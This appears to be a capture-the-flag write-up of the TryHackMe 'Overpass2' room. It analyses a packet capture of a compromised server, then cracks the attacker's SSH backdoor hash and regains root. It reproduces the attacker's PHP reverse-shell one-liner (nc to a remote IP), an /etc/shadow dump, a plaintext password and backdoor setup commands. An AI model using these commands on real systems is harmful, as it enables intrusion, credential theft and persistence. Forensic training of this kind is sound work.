---
title: Overpass2 (hacked)
tags:
- writeups
---

## Analysing the PCAP of our threat actor
- filtered by `HTTP`
	- ![[write-ups/images/Pasted image 20220823180028.png]]
	- taking a look @ what was uploaded we see a php script spawning a reverse shell on port `4242`
		- ![[write-ups/images/Pasted image 20220823180114.png]]
		- `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`
- filtered by ip & port to see what the attacker has done once he got initial access: `ip.addr == 192.168.170.145 && tcp.port eq 4242`
	```bash
	# see who he's logged in as + shell stabilize
	> id
	> python3 -c 'import pty;pty.spawn("/bin/bash")'
	# some dir listing & he cats .overpass?
	> ls -lAh
	-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
	-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
	> cat .overpass
	# then switches to the james user
	> su james
	Password: whenevernoteartinstant
	# checks what can be ran as root
	> sudo -l
	Matching Defaults entries for james on overpass-production:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	User james may run the following commands on overpass-production:
		(ALL : ALL) ALL
	# dumps /etc/shadow & estaablihes persistence with an ssh backdoor
	> sudo cat /etc/shadow
	> git clone https://github.com/NinjaJc01/ssh-backdoor
	> cd ssh-backdoor && ssh-keygen
	> chmod +x backdoor
	> ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
	```
	- he dumped the `/etc/shadow` file, let's see if we can crack some of the passwords ourselves
	- ![[write-ups/images/Pasted image 20220823183200.png]]
## Looking @ the backdoor
Getting a local copy of the backdoor is trivial: `git clone https://github.com/NinjaJc01/ssh-backdoor.git`. Now we can look @ the source code in `main.go`:
- What's the default hash for the backdoor?
	- ![[write-ups/images/Pasted image 20220823183523.png]]
- What's the hardcoded salt for the backdoor?
	- ![[write-ups/images/Pasted image 20220823183533.png]]
- What was the hash that the attacker used? - go back to the PCAP for this!
	- as we've previously seen the attacker used the `-a` tag to specify a custom hash for the backdoor
	- ![[write-ups/images/Pasted image 20220823183624.png]]
- Crack the hash using rockyou and a cracking tool of your choice. What's the password?
	- we know the hash & the salt so safe them into a file formatted as `hash:salt`
	- ![[write-ups/images/Pasted image 20220823183835.png]]
	- now pass it to `hashcat` & grab a coffee
	- ![[write-ups/images/Pasted image 20220823185520.png]]


## The Blue Team Attacks Back
Navigating to the web server we see that he had some fun
![[write-ups/images/Pasted image 20220823191014.png]]

Now nmap shows us aan additional port `2222` that runs ssh, that's the backdoor we previously seen

![[write-ups/images/Pasted image 20220823191047.png]]

Given that we know the password, let's try to ssh:
![[write-ups/images/Pasted image 20220823191118.png]]

Um.... ok it seems that we need to change the `HostkeyAlgorithms` option to [workaround](https://github.com/gitblit/gitblit/issues/1384) this:
![[write-ups/images/Pasted image 20220823191324.png]]

Now trying to run `sudo -l` with any of the previously shown passwords didn't work. So I started looking around & found this peculiar file `.suid_bash`:

![[write-ups/images/Pasted image 20220823191624.png]]

Executing this [[SUID]] file it should give us an easy way to root. With the help of [GTFObins](https://gtfobins.github.io/gtfobins/bash/) we're back in boys, ready to kick the attacker out of the box & restore functionality *(probably better hardening the system after this event😅)*

![[write-ups/images/Pasted image 20220823191926.png]]

## Refs

## See Also
- [[write-ups/THM]]